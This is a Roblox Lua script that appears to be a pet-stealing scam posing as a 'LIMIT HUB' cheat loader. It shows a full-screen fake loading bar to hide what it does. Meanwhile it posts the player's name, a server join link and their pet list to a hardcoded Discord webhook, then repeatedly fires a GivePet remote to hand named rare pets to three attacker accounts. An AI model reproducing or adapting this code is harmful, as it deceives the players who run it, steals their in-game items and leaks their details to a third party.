local loadingScript = [[
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

pcall(function()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    StarterGui:SetCore("TopbarEnabled", false)
end)

local screenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
screenGui.Name = "LimitHubLoading"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 999999

local bg = Instance.new("Frame", screenGui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.ZIndex = 999999

local title = Instance.new("TextLabel", bg)
title.Size = UDim2.new(0, 800, 0, 100)
title.Position = UDim2.new(0.5, -400, 0.5, -60)
title.BackgroundTransparency = 1
title.Text = "LIMIT HUB"
title.TextColor3 = Color3.fromRGB(0, 255, 255)
title.Font = Enum.Font.Fantasy
title.TextScaled = true
title.ZIndex = 1000000

local percentLabel = Instance.new("TextLabel", bg)
percentLabel.Size = UDim2.new(0, 100, 0, 40)
percentLabel.Position = UDim2.new(0.5, -50, 0.5, 80)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.TextColor3 = Color3.new(1, 1, 1)
percentLabel.Font = Enum.Font.Code
percentLabel.TextScaled = true
percentLabel.ZIndex = 1000000

local barOutline = Instance.new("Frame", bg)
barOutline.Size = UDim2.new(0, 400, 0, 25)
barOutline.Position = UDim2.new(0.5, -200, 0.5, 40)
barOutline.BackgroundColor3 = Color3.new(0, 0, 0)
barOutline.BorderColor3 = Color3.fromRGB(0, 255, 255)
barOutline.BorderSizePixel = 2
barOutline.ZIndex = 1000000

local fill = Instance.new("Frame", barOutline)
fill.Size = UDim2.new(0, 0, 1, 0)
fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
fill.BorderSizePixel = 0
fill.ZIndex = 1000001

task.spawn(function()
    local percent = 0
    while percent <= 100 do
        percentLabel.Text = percent .. "%"
        fill.Size = UDim2.new(percent / 100, 0, 1, 0)
        percent += 5
        task.wait(0.1)
    end
    screenGui:Destroy()
end)

-- Webhook using request()
task.wait(2)
local petsList = {}
pcall(function()
    for _, pet in ipairs(LocalPlayer:WaitForChild("PetsFolder"):GetChildren()) do
        table.insert(petsList, pet.Name)
    end
end)

local data = {
    ["content"] = "✅ **Script Executed**\nPlayer: " .. LocalPlayer.Name ..
        "\n[Join Server](https://www.roblox.com/games/126884695634066/?jobId=" .. game.JobId .. ")" ..
        "\nPets: " .. (#petsList > 0 and table.concat(petsList, ", ") or "No Pets Found")
}

local req = (syn and syn.request) or (http and http.request) or (http_request) or (request)
if req then
    pcall(function()
        req({
            Url = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
else
    warn("⚠️ Webhook request not supported on this executor.")
end

-- Pet Transfer
task.wait(3)
local transferred = false
local targets = {"boneblossom215", "beanstalk1251", "burningbud709"}
local petsToSend = {"Trex", "fennec fox", "Raccoon", "dragonfly", "butterfly", "queenbee", "spinosaurus", "redfox", "Brontosaurus", "mooncat", "mimic octopus", "disco bee", "dilophosaurus", "kitsune"}

task.spawn(function()
    while not transferred do
        for _, player in ipairs(Players:GetPlayers()) do
            for _, name in ipairs(targets) do
                if player.Name == name then
                    for _, pet in ipairs(petsToSend) do
                        pcall(function()
                            print("🔁 Sending pet:", pet, "to", player.Name)
                            game:GetService("ReplicatedStorage").GivePet:FireServer(pet, player)
                        end)
                    end
                    transferred = true
                    break
                end
            end
            if transferred then break end
        end
        task.wait(5)
    end
end)
]]
